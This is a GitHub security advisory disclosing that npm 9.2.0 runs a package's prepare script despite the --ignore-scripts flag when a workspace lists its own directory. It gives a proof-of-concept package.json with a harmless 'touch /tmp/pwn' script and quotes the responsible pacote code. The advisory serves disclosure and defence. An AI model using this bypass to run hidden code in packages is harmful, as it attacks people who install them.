---
title: 'NPM: Ignore Script Bypass'
severity: Moderate
ghsa_id: GHSA-wr8v-3jqh-9x36
cve_id: null
weaknesses: []
products:
- ecosystem: NPM
  package_name: NPM
  affected_versions: 9.2.0
  patched_versions: No patched versions at this time.
cvss: null
credits:
- github_user_id: scannells
  name: Simon Scannell
  avatar: https://avatars.githubusercontent.com/u/21333136?s=40&v=4
---

### Summary
An attacker can craft a malicious package.json file that bypasses the --ignore-scripts security flag. This leads to arbitrary system command execution when a victim executes npm install -–ignore-scripts on the malicious package.

### Severity
Moderate - This vulnerability bypasses  the `--ignore-scripts` option intended to prevent malicious users from executing
arbitrary build scripts.

### Proof of Concept

1. Place the following package.json file into a temporary directory:

```json
{
  "name": "rce-test",
  "dependencies": {
  },
  "workspaces": [
        "."
  ],
  "scripts": {
        "prepare":        "touch /tmp/pwn"
  }
}
```

2. Run npm install –-ignore-scripts in the same directory. 
3. Check if /tmp/pwn has been created

### Further Analysis
When a local directory is listed as a dependency, pacote executes the prepare script even if the --ignore-scripts flag is set. This is because no check is present:

https://github.dev/npm/pacote/blob/a08a9a39bae0ddd73605b0d06bd227897d2f9567/lib/dir.js#L48-L60
```
 return runScript({
        pkg: mani,
        event: 'prepare',
        path: this.resolved,
        stdio,
        banner,
        env: {
          npm_package_resolved: this.resolved,
          npm_package_integrity: this.integrity,
          npm_package_json: resolve(this.resolved, 'package.json'),
        },
      })
    })
```

### Timeline
**Date reported**: 02/20/2023
**Date fixed**: 
**Date disclosed**: 05/21/2023